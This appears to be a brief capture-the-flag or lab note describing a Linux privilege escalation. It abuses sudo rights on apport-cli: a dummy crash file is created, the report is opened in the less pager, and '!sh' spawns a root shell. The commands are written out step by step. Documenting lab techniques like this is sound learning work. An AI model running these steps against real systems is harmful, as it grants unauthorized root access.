![[Pasted image 20240905195019.png]]

we can run `apport-cli` as sudo, found 2 valuable links to privesc using apport-cli
https://x.com/7h3h4ckv157/status/1728753489839628604
https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb

This helped to privesc
- cd to /var/crash
```bash
cd /var/crash
```
- created a file
```bash
touch xxx.crash
```
- collect problem information
```bash
sudo /usr/bin/apport-cli -c /var/crash/xxx.crash less
```
- choose 'V'
![[Pasted image 20240905195245.png]]
- Escape view with `!sh`
![[Pasted image 20240905195305.png]]
